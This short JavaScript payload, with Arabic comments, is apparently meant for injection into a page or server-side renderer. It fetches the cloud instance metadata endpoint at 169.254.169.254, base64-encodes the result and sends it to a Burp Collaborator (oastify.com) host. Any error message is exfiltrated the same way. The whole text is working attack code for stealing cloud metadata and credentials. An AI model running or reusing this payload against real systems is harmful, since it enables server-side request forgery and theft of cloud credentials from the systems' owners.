body.script:
// محاولة سحب الميتا داتا وإرسالها للـ Collaborator
fetch('http://169.254.169.254/latest/meta-data/')
    .then(response => response.text())
    .then(data => {
        // تحويل البيانات لـ Base64 وإرسالها في الرابط
        const encodedData = btoa(data);
        fetch('http://f9pmhy3yitfxusabtvftlda0trzinmbb.oastify.com/?exfiltrated=' + encodedData);
    })
    .catch(err => {
        // لو فشل، يبعت رسالة خطأ للـ Collaborator عشان نعرف العائق فين
        fetch('http://f9pmhy3yitfxusabtvftlda0trzinmbb.oastify.com/?error=' + btoa(err.message));
    });
